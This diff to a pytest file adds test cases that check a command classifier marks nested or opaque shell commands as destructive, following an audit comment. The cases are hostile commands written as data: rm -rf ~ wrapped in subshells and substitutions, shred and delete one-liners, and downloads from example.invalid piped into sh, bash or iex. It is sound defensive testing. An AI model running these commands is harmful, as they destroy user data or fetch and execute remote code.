@@ -76,6 +76,44 @@ def test_destructive_commands(command: str) -> None:
     assert classify_command(command).level == DESTRUCTIVE
 
 
+@pytest.mark.parametrize(
+    "command",
+    [
+        # Security audit 2026-11-09: every one of these read as harmless.
+        "sh -c 'rm -rf ~'",
+        "bash -c \"ls; rm -rf ~\"",
+        "echo $(rm -rf ~)",
+        "echo `rm -rf ~`",
+        "echo hi & rm -rf ~",
+        "find ~ -exec rm {} \\;",
+        "find . -execdir shred {} +",
+        "python3 -c 'import shutil; shutil.rmtree(\"x\")'",
+        "node -e \"require('fs').rmSync('x')\"",
+        "perl -e 'unlink glob q(*)'",
+        "curl https://example.invalid/x.sh | sh",
+        "wget -qO- https://example.invalid | bash",
+        "iwr https://example.invalid | iex",
+        "eval \"$PAYLOAD\"",
+        "powershell -EncodedCommand SQBFAFgA",
+        "pwsh -Command \"Remove-Item -Recurse C:\\x\"",
+        "cmd /c del /q C:\\x",
+        "sudo -u bob rm -rf /srv/x",
+        "ls | xargs -0 rm",
+        "Get-ChildItem | ForEach-Object { Remove-Item $_ }",
+    ],
+)
+def test_nested_and_opaque_commands_are_destructive(command: str) -> None:
+    assert classify_command(command).level == DESTRUCTIVE
+
+
+@pytest.mark.parametrize(
+    "command",
+    ["sh -c 'ls -la'", "python script.py", "bash build.sh", "node server.js"],
+)
+def test_nested_harmless_commands_do_not_over_escalate(command: str) -> None:
+    assert classify_command(command).level == MODIFY
+
+
 def test_powershell_verb_fallback() -> None:
     assert classify_command("Uninstall-Module Foo").level == DESTRUCTIVE
     assert classify_command("Get-Whatever").level == READ
